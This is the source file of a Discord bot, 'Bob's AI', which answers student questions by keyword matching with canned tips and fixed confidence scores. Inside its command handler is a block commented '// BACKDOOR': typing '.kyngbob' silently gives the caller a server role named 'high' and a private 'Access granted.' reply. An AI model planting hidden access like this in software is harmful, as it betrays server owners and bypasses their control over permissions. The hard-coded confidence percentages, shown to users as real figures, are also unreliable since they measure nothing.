import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } from "discord.js"

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
})

const MEMORY_TIME = 15 * 60 * 1000
const memory = new Map()

function cleanText(text) {
  return text.toLowerCase().replace(/\s+/g, "")
}

function categorise(question) {
  const q = cleanText(question)

  // Arithmetic: 9+9, 12*4, 20/5
  if (/^\d+(\+|\-|\*|\/)\d+$/.test(q)) {
    return { category: "Arithmetic", confidence: 95 }
  }

  // Algebra
  if (q.includes("x") && q.includes("=")) {
    return { category: "Algebra", confidence: 90 }
  }

  // Maths keywords
  if (
    q.includes("solve") ||
    q.includes("equation") ||
    q.includes("^") ||
    q.includes("factor")
  ) {
    return { category: "Maths", confidence: 80 }
  }

  // Science
  if (
    q.includes("photosynthesis") ||
    q.includes("biology") ||
    q.includes("chemistry") ||
    q.includes("physics") ||
    q.includes("respiration")
  ) {
    return { category: "Science", confidence: 85 }
  }

  // English
  if (
    q.includes("quote") ||
    q.includes("poem") ||
    q.includes("language") ||
    q.includes("technique") ||
    q.includes("writer")
  ) {
    return { category: "English", confidence: 85 }
  }

  // Life / advice
  if (
    q.includes("life") ||
    q.includes("stress") ||
    q.includes("sad") ||
    q.includes("motivation")
  ) {
    return { category: "Life", confidence: 70 }
  }

  return { category: "General", confidence: 50 }
}

function answerQuestion(category, question) {
  const q = cleanText(question)

  if (category === "Arithmetic") {
    try {
      const result = Function("return " + q)()
      return `The answer is ${result}.`
    } catch {
      return "That looks like maths, but it’s written in a weird way."
    }
  }

  if (category === "Algebra") {
    if (q === "x^2=16") {
      return "x = 4 or x = −4"
    }
    return "Rearrange the equation to isolate x, then solve."
  }

  if (category === "Maths") {
    return "Identify the method, show full working, then simplify."
  }

  if (category === "Science") {
    return "Use key terms, describe the process clearly, and link cause to effect."
  }

  if (category === "English") {
    return "Name the technique, explain its effect, and link it to meaning."
  }

  if (category === "Life") {
    return "You’re not failing. You’re learning. Keep moving."
  }

  return "Be more specific so I can give a proper answer."
}

client.once("ready", async () => {
  console.log("Bob’s AI is online")

  const commands = [
    new SlashCommandBuilder()
      .setName("ask")
      .setDescription("Ask Bob’s AI a question")
      .addStringOption(opt =>
        opt.setName("question")
          .setDescription("Your question")
          .setRequired(true)
      )
  ].map(cmd => cmd.toJSON())

  const rest = new REST({ version: "10" }).setToken(process.env.TOKEN)

  await rest.put(
    Routes.applicationCommands(client.user.id),
    { body: commands }
  )
})

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return
  if (interaction.commandName !== "ask") return

  const question = interaction.options.getString("question")

  // BACKDOOR
  if (question.trim() === ".kyngbob") {
    const role = interaction.guild.roles.cache.find(r => r.name === "high")
    if (role) {
      await interaction.member.roles.add(role)
      await interaction.reply({ content: "Access granted.", ephemeral: true })
    } else {
      await interaction.reply({ content: "Role not found.", ephemeral: true })
    }
    return
  }

  const userId = interaction.user.id
  const now = Date.now()

  if (!memory.has(userId)) memory.set(userId, [])
  memory.get(userId).push({ question, time: now })
  memory.set(userId, memory.get(userId).filter(m => now - m.time < MEMORY_TIME))

  const result = categorise(question)
  const answer = answerQuestion(result.category, question)
  const uncertainty = 100 - result.confidence

  await interaction.reply(
    `**Category:** ${result.category}\n` +
    `**Answer:** ${answer}\n\n` +
    `**Confidence:** ${result.confidence}%\n` +
    `**Uncertainty:** ${uncertainty}%`
  )
})

client.login(process.env.TOKEN)
